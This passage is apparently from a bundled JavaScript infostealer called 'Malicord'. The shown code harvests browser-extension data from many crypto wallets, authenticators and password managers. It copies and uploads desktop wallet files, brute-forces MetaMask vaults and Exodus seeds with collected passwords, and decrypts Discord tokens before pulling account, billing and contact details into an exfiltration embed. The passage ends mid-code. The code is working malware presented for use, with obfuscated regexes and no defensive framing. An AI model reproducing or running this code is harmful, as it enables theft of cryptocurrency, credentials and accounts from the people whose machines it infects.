Data\\\\%PROFILE%\\\\Local Extension Settings\",\n    local + \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Local Extension Settings\",\n    local + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\%PROFILE%\\\\Local Extension Settings\",\n  ];\n\n  var browsers_profile = [];\n  for (var i = 0; i < browsers_path.length; i++) {\n    const browser = browsers_path[i];\n    const profiles = core.getProfiles(browser, browser.split(\"\\\\\")[6]);\n    for (var j = 0; j < profiles.length; j++) {\n      browsers_profile.push(profiles[j]);\n    }\n  }\n\n  return browsers_profile;\n}\n\nfunction MalicordExtensions(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const browsers_profile = getBrowsersProfile();\n\n    const extensions = [\n      new Extension(\"Trust Wallet\", \"egjidjbpglichdcondbcbdnbeeppgdph\"),\n      new Extension(\"Jaxx Liberty\", \"ocefimbphcgjaahbclemolcmkeanoagc\"),\n      new Extension(\"Atomic Wallet\", \"dlbmjjglhklgdodnkdlenlicpgppjcdd\"),\n      new Extension(\"Electrum\", \"hieplnfojfccegoloniefimmbfjdgcgp\"),\n      new Extension(\"Mycelium\", \"pidhddgciaponoajdngciiemcflpnnbg\"),\n      new Extension(\"Coinomi\", \"blbpgcogcoohhngdjafgpoagcilicpjh\"),\n      new Extension(\"GreenAddress\", \"gflpckpfdgcagnbdfafmibcmkadnlhpj\"),\n      new Extension(\"Edge\", \"doljkehcfhidippihgakcihcmnknlphh\"),\n      new Extension(\"BRD\", \"nbokbjkelpmlgflobbohapifnnenbjlh\"),\n      new Extension(\"Samourai Wallet\", \"apjdnokplgcjkejimjdfjnhmjlbpgkdi\"),\n      new Extension(\"Airbitz\", \"dojmlmceifkfgkgeejemfciibjehhdcl\"),\n      new Extension(\"Trezor\", \"jpxupxjxheguvfyhfhahqvxvyqthiryh\"),\n      new Extension(\"Ledger Live\", \"pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln\"),\n      new Extension(\"Ledger Wallet\", \"hbpfjlflhnmkddbjdchbbifhllgmmhnm\"),\n      new Extension(\"YubiKey\", \"mammpjaaoinfelloncbbpomjcihbkmmc\"),\n      new Extension(\"Digital Bitbox\", \"dbhklojmlkgmpihhdooibnmidfpeaing\"),\n      new Extension(\"Google Authenticator\", \"khcodhlfkpmhibicdjjblnkgimdepgnd\"),\n      new Extension(\"Microsoft Authenticator\", \"bfbdnbpibgndpjfhonkflpkijfapmomn\"),\n      new Extension(\"Authy\", \"gjffdbjndmcafeoehgdldobgjmlepcal\"),\n      new Extension(\"Duo Mobile\", \"eidlicjlkaiefdbgmdepmmicpbggmhoj\"),\n      new Extension(\"OTP Auth\", \"bobfejfdlhnabgglompioclndjejolch\"),\n      new Extension(\"Dashlane\", \"flikjlpgnpcjdienoojmgliechmmheek\"),\n      new Extension(\"FreeOTP\", \"elokfmmmjbadpgdjmgglocapdckdcpkn\"),\n      new Extension(\"Aegis Authenticator\", \"ppdjlkfkedmidmclhakfncpfdmdgmjpm\"),\n      new Extension(\"LastPass Auth\", \"cfoajccjibkjhbdjnpkbananbejpkkjb\"),\n      new Extension(\"Keeper\", \"gofhklgdnbnpcdigdgkgfobhhghjmmkj\"),\n      new Extension(\"RoboForm\", \"hppmchachflomkejbhofobganapojjol\"),\n      new Extension(\"KeePass\", \"lbfeahdfdkibininjgejjgpdafeopflb\"),\n      new Extension(\"KeePassXC\", \"kgeohlebpjgcfiidfhhdlnnkhefajmca\"),\n      new Extension(\"Bitwarden\", \"inljaljiffkdgmlndjkdiepghpolcpki\"),\n      new Extension(\"NordPass\", \"njgnlkhcjgmjfnfahdmfkalpjcneebpl\"),\n      new Extension(\"LastPass\", \"gabedfkgnbglfbnplfpjddgfnbibkmbb\"),\n      new Extension(\"CommonKey\", \"chgfefjpcobfbnpmiokfjjaglahmnded\"),\n      new Extension(\"Splikity\", \"jhfjfclepacoldmjmkmdlmganfaalklb\"),\n      new Extension(\"MicrosoftAutofill\", \"fiedbfgcleddlbcmgdigjgdfcggjcion\"),\n      new Extension(\"KeePass\", \"fmhmiaejopepamlcjkncpgpdjichnecm\"),\n      new Extension(\"KeePassXC\", \"oboonakemofpalcgghocfoadofidjkkk\"),\n      new Extension(\"MYKI Password Manager\", \"bmikpgodpkclnkgmnpphehdgcimmided\"),\n      new Extension(\"Browserpass\", \"naepdomgkenhinolocfifgehidddafch\"),\n      new Extension(\"LastPass\", \"hdokiejnpimakedhajhdlcegeplioahd\"),\n      new Extension(\"RoboForm Manager\", \"pnlccmojcmeohlpggmfnbbiapkmbliob\"),\n      new Extension(\"Metamask\", \"nkbihfbeogaeaoehlefnkodbefgpgknn\"),\n      new Extension(\"Exodus\", \"aholpfdialjgjfhomihkjbmgjidlcdno\"),\n      new Extension(\"Sollet\", \"fhmfendgdocmcbmfikdcogofphimnkno\"),\n      new Extension(\n        \"Trezor Password Manager\",\n        \"imloifkgjagghnncjkhggdhalmcnfklk\"\n      ),\n      new Extension(\"GAuth Authenticator\", \"ilgcnhelpchnceeipipijaljkblbcobl\"),\n      new Extension(\"EOS Authenticator\", \"oeljdldpnmdbchonielidgobddffflal\"),\n      new Extension(\"Authy\", \"gaedmjdfmmahhbjefcbgaolhhanlaolb\"),\n      new Extension(\"Authenticator\", \"bhghoamapcdpbohphigoooaddinpkbai\"),\n      new Extension(\"EO.Finance\", \"hoighigmnhgkkdaenafgnefkcmipfjon\"),\n      new Extension(\"TronLink\", \"ibnejdfjmmkpcnlpebklmnkoeoihofec\"),\n      new Extension(\"Coinbase\", \"hnfanknocfeofbddgcijnmhnfnkdnaad\"),\n      new Extension(\"Jaxx Liberty\", \"cjelfplplebdjjenllpjcblmjkfcffne\"),\n      new Extension(\"Guarda\", \"hpglfhgfnhbgpjdenjgmdgoeiappafln\"),\n      new Extension(\"Math\", \"afbcbjpbpfadlkmhmclhkeeodmamcflc\"),\n      new Extension(\"Binance\", \"fhbohimaelbohpjbbldcngcnapndodjp\"),\n      new Extension(\"Nifty\", \"jbdaocneiiinmjbjlgalhcelgbejmnid\"),\n      new Extension(\"Yoroi\", \"ffnbelfdoeiohenkjibnmadjiehjhajb\"),\n      new Extension(\"EQUAL\", \"blnieiiffboillknjnepogjhkgnoapac\"),\n      new Extension(\"BitApp\", \"fihkakfobkmkjojpchpfgcmhfjnmnfpi\"),\n      new Extension(\"iwallet\", \"kncchdigobghenbbaddojjnnaogfppfj\"),\n      new Extension(\"Wombat\", \"amkmjjmmflddogmhpjloimipbofnfjih\"),\n      new Extension(\"MEW CX\", \"nlbmnnijcnlegkjjpcfjclmcfggfefdm\"),\n      new Extension(\"Guild\", \"nanjmdknhkinifnkgdcggcfnhdaammmj\"),\n      new Extension(\"Ronin\", \"fnjhmkhhmkbjkkabndcnnogagogbneec\"),\n      new Extension(\"NeoLine\", \"cphhlgmgameodnhkjdmkpanlelnlohao\"),\n      new Extension(\"Clover\", \"nhnkbkgjikgcigadomkphalanndcapjk\"),\n      new Extension(\"Liquality\", \"kpfopkelmapcoipemfendmdcghnegimn\"),\n      new Extension(\"Terra Station\", \"aiifbnbfobpmeekipheeijimdpnlpgpp\"),\n      new Extension(\"Keplr\", \"dmkamcknogkgcdfhhbddcghachkejeap\"),\n      new Extension(\"Coin98\", \"aeachknmefphepccionboohckonoeemg\"),\n      new Extension(\"ZilPay\", \"klnaejjgbibmhlephnhpmaofohgkpgkd\"),\n      new Extension(\"Hycon Lite Client\", \"bcopgchhojmggmffilplmbdicgaihlkp\"),\n      new Extension(\"Nash\", \"onofpnbbkehpmmoabgpcpmigafmmnjhl\"),\n      new Extension(\"Steem Keychain\", \"jhgnbkkipaallpehbohjmkbjofjdmeid\"),\n      new Extension(\"BitClip\", \"ijmpgkjfkbfhoebgogflfebnmejmfbml\"),\n      new Extension(\"DAppPlay\", \"lodccjjbdhfakaekdiahmedfbieldgik\"),\n      new Extension(\"Auro\", \"cnmamaachppnkjgnildpdmkaakejnhae\"),\n      new Extension(\"Polymesh\", \"jojhfeoedkpkglbfimdfabpdfjaoolaf\"),\n      new Extension(\"ICONex\", \"flpiciilemghbmfalicajoolhkkenfel\"),\n      new Extension(\"Nabox\", \"nknhiehlklippafakaeklbeglecifhad\"),\n      new Extension(\"KHC\", \"hcflpincpppdclinealmandijcmnkbgn\"),\n      new Extension(\"Temple\", \"ookjlbkiijinhpmnjffcofjonbfbgaoc\"),\n      new Extension(\"TezBox\", \"mnfifefkajgofkcjkemidiaecocnkjeh\"),\n      new Extension(\"Cyano\", \"dkdedlpgdmmkkfjabffeganieamfklkm\"),\n      new Extension(\"Byone\", \"nlgbhdfgdhgbiamfdfmbikcdghidoadd\"),\n      new Extension(\"OneKey\", \"infeboajgfhgbjpjbeppbkgnabfdkdaf\"),\n      new Extension(\"Leaf\", \"cihmoadaighcejopammfbmddcmdekcje\"),\n      new Extension(\"Dashlane\", \"fdjamakpfbbddfjaooikfcpapjohcfmg\"),\n      new Extension(\"NordPass\", \"fooolghllnmhmmndgjiamiiodkpenpbb\"),\n      new Extension(\"BitWarden\", \"nngceckbapebfimnlniiiahkandclblb\"),\n    ];\n\n    var final_extensions = [];\n    for (var i = 0; i < browsers_profile.length; i++) {\n      const profile = browsers_profile[i].path;\n      for (var j = 0; j < extensions.length; j++) {\n        const extension = extensions[j];\n        const path = profile + \"\\\\\" + extension.id;\n        if (fs.existsSync(path)) {\n          extension.addPath(path);\n          extension.addProfile(profile.split(\"\\\\\")[6].replace(\" \", \"\"));\n          final_extensions.push(extension);\n        }\n      }\n    }\n\n    for (var i = 0; i < final_extensions.length; i++) {\n      const extension = final_extensions[i];\n      stat.AddExtensions(extension.name);\n      save.Save(\n        extension.path + \"\\\\\",\n        \"Wallets\",\n        \"Extensions\\\\\" + extension.name + \"-\" + extension.profile\n      );\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function MalicordColds(cc) {\n  if (cc != \"yes\") return;\n  try {\n    const appdata = process.env.appdata;\n    const local = process.env.localappdata;\n    const colds = [\n      new Cold(\"Exodus\", appdata + \"\\\\Exodus\", [\n        appdata + \"\\\\Exodus\\\\exodus.wallet\\\\\",\n        appdata + \"\\\\Exodus\\\\exodus.conf.json\",\n        appdata + \"\\\\Exodus\\\\window-state.json\",\n      ]),\n      new Cold(\"Electrum\", appdata + \"\\\\Electrum-LTC\", [\n        appdata + \"\\\\Electrum-LTC\\\\wallets\\\\\",\n      ]),\n      new Cold(\"Atomic\", appdata + \"\\\\atomic\", [\n        appdata + \"\\\\atomic\\\\Local Storage\\\\leveldb\\\\\",\n      ]),\n      new Cold(\"MultiDog\", appdata + \"\\\\MultiDog\", [\n        appdata + \"\\\\MultiDog\\\\multidoge.wallet\\\\\",\n      ]),\n      new Cold(\"Bitcoin Core\", appdata + \"\\\\Bitcoin\\\\Bitcoin Core\", [\n        appdata + \"\\\\Bitcoin\\\\Bitcoin Core\\\\wallet.dat\",\n      ]),\n      new Cold(\"Binance\", appdata + \"\\\\Binance\", [\n        appdata + \"\\\\Binance\\\\app-store.json\",\n        appdata + \"\\\\Binance\\\\Cookies\",\n      ]),\n      new Cold(\"Coinomi\", appdata + \"\\\\Coinomi\", [\n        appdata + \"\\\\Coinomi\\\\wallets\\\\\",\n      ]),\n      new Cold(\"Jax\", appdata + \"\\\\jaxx\", [\n        appdata + \"\\\\jaxx\\\\LocalStorage\\\\file_0.localstorage\",\n      ]),\n      new Cold(\"ElectronCash\", appdata + \"\\\\ElectronCash\", [\n        appdata + \"\\\\ElectronCash\\\\wallets\\\\default_wallet\",\n      ]),\n      new Cold(\"Electrum\", appdata + \"\\\\Electrum\", [\n        appdata + \"\\\\Electrum\\\\wallets\\\\\",\n      ]),\n      new Cold(\"Ether\", appdata + \"\\\\Ethereum\", [\n        appdata + \"\\\\Ethereum\\\\keystore\\\\\",\n      ]),\n      new Cold(\"Zcash\", appdata + \"\\\\Zcash\", [appdata + \"\\\\Zcash\"]),\n      new Cold(\"Armory\", appdata + \"\\\\Armory\", [appdata + \"\\\\Armory\"]),\n      new Cold(\"Bytecoin\", appdata + \"\\\\Bytecoin\", [appdata + \"\\\\Bytecoin\"]),\n      new Cold(\"Jaxx\", appdata + \"\\\\Jaxx\", [\n        appdata +\n          \"\\\\Jaxx\\\\com.liberty.jaxx\\\\IndexedDB\\\\file_0.indexeddb.leveldb\",\n      ]),\n      new Cold(\"Guarda\", appdata + \"\\\\Guarda\", [\n        appdata + \"\\\\Guarda\\\\Local Storage\\\\leveldb\",\n      ]),\n      new Cold(\"Coinomi\", local + \"\\\\Coinomi\", [\n        appdata + \"\\\\Coinomi\\\\Coinomi\\\\wallets\",\n      ]),\n    ];\n\n    for (var i = 0; i < colds.length; i++) {\n      const cold = colds[i];\n      if (fs.existsSync(cold.existpath)) {\n        if (cold.name == \"Exodus\") {\n          stat.AddColds(cold.name);\n          await save.ArraySave(cold.stealpath, \"Wallets\", cold.name);\n\n          const zipPath = await save.zip(cold.stealpath);\n          let exodusurl = await upload(zipPath);\n          stat.addExodusLink(exodusurl);\n        }\n        if (cold.name == \"Atomic\") {\n          stat.AddColds(cold.name);\n          await save.ArraySave(cold.stealpath, \"Wallets\", cold.name);\n\n          const zipPath = await save.zip(cold.stealpath);\n          let atomicurl = await upload(zipPath);\n          stat.addAtomicLink(atomicurl);\n        }\n        stat.AddColds(cold.name);\n        save.ArraySave(cold.stealpath, \"Wallets\", cold.name);\n      }\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function Decrypt(data, key) {\n  var res = \"\";\n  try {\n    res = await passworder.decrypt(key, data);\n  } catch (err) {}\n  return res;\n}\n\nasync function decodeMetamask(password, vault) {\n  var vaultJson = null;\n  try {\n    var vaultJson = JSON.parse(vault);\n  } catch (e) {}\n\n  if (vaultJson == null) {\n    return;\n  }\n\n  return await Decrypt(vault, password);\n}\n\nfunction getMnemonic(json) {\n  var res = \"\";\n  for (var key of json) {\n    var mnemonic = key.data.mnemonic;\n    if (mnemonic != undefined) {\n      if (Array.isArray(mnemonic)) {\n        res = Buffer.from(mnemonic).toString(\"utf-8\");\n      } else {\n        res = mnemonic;\n      }\n    }\n  }\n  return res;\n}\n\nfunction decryptExodus(data, phrase) {\n  try {\n    seco.decryptData(data, phrase);\n    return phrase;\n  } catch (ex) {\n    return \"\";\n  }\n}\n\nasync function decryptFileSeco(filename, passwlist) {\n  const list = passwlist;\n  var data = fs.readFileSync(filename);\n  var phrase;\n  try {\n    if (list.length > 0) {\n      list.forEach(function (element) {\n        phrase = decryptExodus(data, element);\n        if (phrase != \"\" && !stat.exodus.includes(phrase)) {\n          stat.AddExodus(phrase);\n        }\n      });\n    }\n  } catch (e) {}\n}\n\nasync function exodusDecrypt(cc, passwords) {\n  if (cc != \"yes\") return;\n  const appdata = process.env.appdata;\n  const seedpath = appdata + \"\\\\Exodus\\\\exodus.wallet\\\\seed.seco\";\n  if (fs.existsSync(seedpath)) {\n    try {\n      decryptFileSeco(seedpath, passwords);\n    } catch (e) {}\n  } else {\n  }\n}\n\nasync function MalicordMetamask(passwords) {\n  const browsers_profile = getBrowsersProfile();\n\n  var folders = [];\n  var vaults = [];\n\n  for (let i = 0; i < browsers_profile.length; i++) {\n    const browser = browsers_profile[i];\n    const savePath = browser + \"\\\\nkbihfbeogaeaoehlefnkodbefgpgknn\\\\\";\n    if (fs.existsSync(savePath)) {\n      folders.push(savePath);\n    }\n  }\n\n  for (let i = 0; i < folders.length; i++) {\n    const folder = folders[i];\n    const files = fs.readdirSync(folder);\n\n    for (let u = 0; u < files.length; u++) {\n      const file = files[u];\n\n      if (file.endsWith(\".log\")) {\n        const data = fs.readFileSync(folder + file, \"utf-8\");\n\n        const regex = /\\\"vault\":\"(?:[^\\\\\"]|\\\\\\\\|\\\\\")*\"\\}/gm;\n\n        const finds = data.match(regex);\n\n        for (let o = 0; o < finds.length; o++) {\n          const find = finds[o];\n\n          vaults.push(\n            find.replace(/\\\\/gm, \"\").replace('\"vault\":\"', \"\").slice(0, -2)\n          );\n        }\n      }\n    }\n  }\n\n  vaults = [...new Set(vaults)];\n\n  var mnemonics = [];\n\n  for (let i = 0; i < vaults.length; i++) {\n    const vault = vaults[i];\n\n    for (let u = 0; u < passwords.length; u++) {\n      const password = passwords[u];\n      var tryPass = await decodeMetamask(password, vault);\n\n      if (tryPass != \"\" && tryPass != undefined) {\n        mnemonics.push(getMnemonic(tryPass));\n      }\n    }\n  }\n\n  mnemonics = [...new Set(mnemonics)];\n  mnemonics = mnemonics.filter((e) => e);\n  let phrases = [];\n  for (let i = 0; i < mnemonics.length; i++) {\n    phrases.push({\n      phrase: mnemonics[i],\n    });\n  }\n  return phrases;\n}\n\nmodule.exports = {\n  MalicordExtensions,\n  MalicordColds,\n  MalicordMetamask,\n  exodusDecrypt,\n};\n\n\n//# sourceURL=webpack://script/./utils/crypto.js?");

/***/ }),

/***/ "./utils/discord.js":
/*!**************************!*\
  !*** ./utils/discord.js ***!
  \**************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n  core = __webpack_require__(/*! ./core */ \"./utils/core.js\"),\n  axios = __webpack_require__(/*! axios */ \"axios\"),\n  boukiapi = __webpack_require__(/*! boukiapi */ \"boukiapi\"),\n  crypto = __webpack_require__(/*! crypto */ \"crypto\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  { embeds, stats, badge } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\n\nasync function WriteDiscord(profiles) {\n  const basepath = stat.testpath[0];\n  const socialDir = path.join(basepath, \"Social\");\n  const DiscordDir = path.join(socialDir, \"Discord\");\n  try {\n    if (!fs.existsSync(socialDir)) {\n      fs.mkdirSync(socialDir);\n    }\n    if (!fs.existsSync(DiscordDir)) {\n      fs.mkdirSync(DiscordDir);\n    }\n  } catch (e) {\n    return;\n  }\n  if(!profiles)return;\n  if(!profiles.length < 1)return;\n  const dscFilePath = path.join(DiscordDir, \"Discord.txt\");\n  fs.writeFileSync(dscFilePath, core.getHeader() + JSON.stringify(profiles));\n}\n\nclass DiscordAccount {\n  constructor(\n    username,\n    discriminator,\n    id,\n    nitro,\n    badges,\n    billings,\n    email,\n    phone,\n    token,\n    avatar\n  ) {\n    this.username = username;\n    this.tag = `${username}#${discriminator}`;\n    this.id = id;\n    this.nitro = nitro;\n    this.badges = badges;\n    this.billings = billings;\n    this.email = email;\n    if (phone != \"\" && phone != undefined) {\n      this.phone = phone;\n    } else {\n      this.phone = \"None\";\n    }\n    this.token = token;\n    this.avatar =\n      \"https://cdn.discordapp.com/avatars/\" + id + \"/\" + avatar + \".png\";\n  }\n}\n\nfunction getBadges(json) {\n  let badges = [\n    {\n      name: badge.staff,\n      flag: 1,\n    },\n    {\n      name: badge.partner,\n      flag: 2,\n    },\n    {\n      name: badge.hypesquad_event,\n      flag: 4,\n    },\n    {\n      name: badge.bughunter_1,\n      flag: 8,\n    },\n    {\n      name: badge.bughunter_2,\n      flag: 16384,\n    },\n    {\n      name: badge.developer,\n      flag: 131072,\n    },\n    {\n      name: badge.early,\n      flag: 512,\n    },\n    {\n      name: badge.bravery,\n      flag: 64,\n    },\n    {\n      name: badge.brillance,\n      flag: 128,\n    },\n    {\n      name: badge.balance,\n      flag: 256,\n    },\n    {\n      name: badge.active_developer,\n      flag: 4194304,\n    },\n  ];\n\n  let flag = json[\"flags\"];\n  var badgesRes = \"\";\n\n  for (let badge of badges) {\n    if ((flag & badge.flag) == badge.flag) {\n      badgesRes = badgesRes + \" \" + badge.name;\n    }\n  }\n\n  return badgesRes == \"\" ? \"`None`\" : badgesRes;\n}\n\nasync function getInventory(token) {\n  const url = \"https://discord.com/api/v9/outbound-promotions\";\n  const authToken = token;\n\n  try {\n    const response = await axios.get(url, {\n      headers: {\n        Authorization: `${authToken}`,\n      },\n    });\n\n    if (response.status === 200) {\n      const promotion = response.data;\n      const g = promotion.map((prom) => ` ${prom.outbound_title}`);\n      const gString = g.join(\"\\n\");\n      return gString;\n    } else {\n      return null;\n    }\n  } catch (error) {\n    return null;\n  }\n}\nasync function getBilling(token) {\n  var billings = \"\";\n  try {\n    const res = await axios({\n      url: `https://canary.discord.com/api/v9/users/@me/billing/payment-sources`,\n      method: \"GET\",\n      headers: {\n        Authorization: `${token}`,\n      },\n    });\n\n    for (let billing of res.data) {\n      let type = billing[\"type\"];\n      let invalid = billing[\"invalid\"];\n\n      if (type == 1 && !invalid) {\n        billings = billings + ` ${embeds.creditcard}`;\n      }\n      if (type == 2 && !invalid) {\n        billings = billings + ` ${embeds.paypal}`;\n      }\n    }\n  } catch (e) {}\n  return billings == \"\" ? \"`None`\" : billings;\n}\nasync function getAccounts(tokens) {\n  let accounts = [];\n  let validTokensCount = 0;\n\n  for (let i = 0; i < tokens.length; i++) {\n    let token = tokens[i];\n    let billing = await getBilling(token);\n\n    try {\n      const res = await axios({\n        url: `https://discord.com/api/v9/users/@me`,\n        method: \"GET\",\n        headers: {\n          Authorization: `${token}`,\n        },\n      });\n\n      const json = res.data;\n\n      if (json.message == null) {\n        accounts.push(\n          new DiscordAccount(\n            json.username,\n            json.discriminator,\n            json.id,\n            \"NigaUnused\",\n            getBadges(json),\n            billing,\n            json.email,\n            json.phone,\n            token,\n            json.avatar\n          )\n        );\n        validTokensCount++;\n      }\n    } catch (e) {}\n  }\n  return accounts;\n}\n\nconst appdata = process.env.appdata;\nconst local = process.env.localappdata;\n\nasync function MalicordDiscord() {\n  var tokens = [];\n  var discordpaths = {\n    Discord: appdata + \"\\\\discord\\\\Local Storage\\\\leveldb\\\\\",\n    \"Discord Canary\": appdata + \"\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\\",\n    Lightcord: appdata + \"\\\\Lightcord\\\\Local Storage\\\\leveldb\\\\\",\n    \"Discord PTB\": appdata + \"\\\\discordptb\\\\Local Storage\\\\leveldb\\\\\",\n  };\n\n  for (let [key, value] of Object.entries(discordpaths)) {\n    if (!fs.existsSync(value)) {\n      continue;\n    }\n\n    for (var file_name of fs.readdirSync(value)) {\n      if (!file_name.endsWith(\".log\") && !file_name.endsWith(\".ldb\")) {\n        continue;\n      }\n\n      let path_split = value.split(\"\\\\\"),\n        path_split_tail = value.includes(\"Network\")\n          ? path_split.splice(0, path_split.length - 3)\n          : path_split.splice(0, path_split.length - 2),\n        path_tail = path_split_tail.join(\"\\\\\") + \"\\\\\";\n\n      for (var line of fs\n        .readFileSync(`${value}/${file_name}`, \"utf8\")\n        .split(\"\\n\")) {\n        if (value.includes(\"cord\")) {\n          let encrypted = Buffer.from(\n            JSON.parse(\n              fs.readFileSync(path_tail.replace(\"Local Storage\", \"Local State\"))\n            ).os_crypt.encrypted_key,\n            \"base64\"\n          ).slice(5);\n\n          const _key = boukiapi.unprotectData(\n            Buffer.from(encrypted, \"utf-8\"),\n            null,\n            \"CurrentUser\"\n          );\n\n          var encrypted_regex = /dQw4w9WgXcQ:[^\\\"]*/;\n          if (line.match(encrypted_regex)) {\n            try {\n              var token = Buffer.from(\n                line.match(encrypted_regex)[0].split(\"dQw4w9WgXcQ:\")[1],\n                \"base64\"\n              );\n              let start = token.slice(3, 15),\n                middle = token.slice(15, token.length - 16),\n                end = token.slice(token.length - 16, token.length),\n                decipher = crypto.createDecipheriv(\"aes-256-gcm\", _key, start);\n              decipher.setAuthTag(end);\n              token =\n                decipher.update(middle, \"base64\", \"utf-8\") +\n                decipher.final(\"utf-8\");\n              tokens.push(token);\n            } catch (e) {}\n          }\n        }\n      }\n    }\n  }\n\n  var browsers_path = [\n    appdata + \"\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb\\\\\",\n    appdata + \"\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb\\\\\",\n    local +\n      \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Iridium\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local +\n      \"\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\uCozMedia\\\\Uran\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Microsoft\\\\Edge\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Google\\\\Chrome\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n    local + \"\\\\Vivaldi\\\\User Data\\\\%PROFILE%\\\\Local Storage\\\\leveldb\\\\\",\n  ];\n\n  var browsers_profile = [];\n  for (var i = 0; i < browsers_path.length; i++) {\n    const browser = browsers_path[i];\n    const profiles = core.getProfiles(browser, browser.split(\"\\\\\")[6]);\n    for (var j = 0; j < profiles.length; j++) {\n      browsers_profile.push(profiles[j].path);\n    }\n  }\n  const reg1 = Buffer.from(\n    \"W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9\",\n    \"base64\"\n  ).toString();\n  const reg2 = Buffer.from(\"bWZhXC5bXHctXXs4NH0=\", \"base64\").toString();\n  const reg3 = Buffer.from(\n    \"W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfQ==\",\n    \"base64\"\n  ).toString();\n\n  const cleanRegex = [\n    new RegExp(reg1, \"gm\"),\n    new RegExp(reg2, \"gm\"),\n    new RegExp(reg3, \"gm\"),\n  ];\n\n  for (let path of browsers_profile) {\n    if (!fs.existsSync(path)) {\n      continue;\n    }\n\n    let files = fs.readdirSync(path);\n    for (let file of files) {\n      for (let reg of cleanRegex) {\n        if (!(file.endsWith(\".log\") || file.endsWith(\".ldb\"))) {\n          continue;\n        }\n\n        let content = fs.readFileSync(path + file, \"utf-8\");\n        Array.prototype.push.apply(tokens, content.match(reg));\n      }\n    }\n  }\n  let uniqueTokens = [];\n  tokens.forEach((token) => {\n    let prefix = token.split(\".\")[0];\n    if (\n      !uniqueTokens.some((existingToken) => existingToken.startsWith(prefix))\n    ) {\n      uniqueTokens.push(token);\n    }\n  });\n  tokens = tokens.filter(function (item, pos) {\n    return tokens.indexOf(item) == pos && item != null;\n  });\n  return await getAccounts(uniqueTokens);\n}\n\nconst calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));\n\nconst GetNitro = (r) => {\n  if (!r) return;\n  if (!r.premium_type) return \":x:\";\n  switch (r.premium_type) {\n    default:\n      return \":x:\";\n    case 1:\n      return badge.nitro;\n    case 2:\n      if (!r.premium_guild_since) return badge.nitro;\n      var now = new Date(Date.now());\n      var arr = [\n        badge.boost_1,\n        badge.boost_2,\n        badge.boost_3,\n        badge.boost_6,\n        badge.boost_9,\n        badge.boost_12,\n        badge.boost_15,\n        badge.boost_18,\n        badge.boost_24,\n      ];\n      var a = [\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n        new Date(r.premium_guild_since),\n      ];\n      var b = [1, 2, 3, 6, 9, 12, 15, 18, 24];\n      var r = [];\n      for (var p in a)\n        r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000));\n      var i = 0;\n      for (var p of r) p > 0 ? \"\" : i++;\n      return `${badge.nitro} ${arr[i]}`;\n  }\n};\n\nasync function embed(\n  username,\n  tag,\n  id,\n  nitro,\n  badges,\n  billings,\n  email,\n  phone,\n  token,\n  avatar,\n  password\n) {\n  let gs = await getInventory();\n  var Nitro = await getURL(\n    \"https://discord.com/api/v9/users/\" + id + \"/profile\",\n    token\n  );\n  let embed = {\n    color: 10038562,\n    author: {\n      name: `${tag} (${id})`,\n      icon_url: `https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png`,\n    },\n    fields: [\n      {\n        name: `${embeds.token} Token`,\n        value: `\\`\\`\\`ansi\\n\u001b[2;32m${token}\u001b[0m\u001b[2;32m\u001b[0m\\`\\`\\`\\n[Copy Token](https://scarpatta.fun/copy/${token})`,\n        inline: false,\n      },\n      { \n        name: `${embeds.badges} Badges`, \n        value: `${badges}`, \n        inline: true,\n      },\n      {\n        name: `${embeds.nitro} Nitro`,\n        value: `${GetNitro(Nitro)}`,\n        inline: true,\n      },\n      {\n        name: `${embeds.billings} Billings`,\n        value: `${billings}`,\n        inline: true,\n      },\n      {\n        name: `${embeds.mail} Email`,\n        value: `\\`\\`\\`ansi\\n\u001b[2;32m${email}\u001b[0m\u001b[2;32m\u001b[0m\\`\\`\\``,\n        inline: true,\n      },\n      {\n        name: `${embeds.phone} Phone`,\n        value: 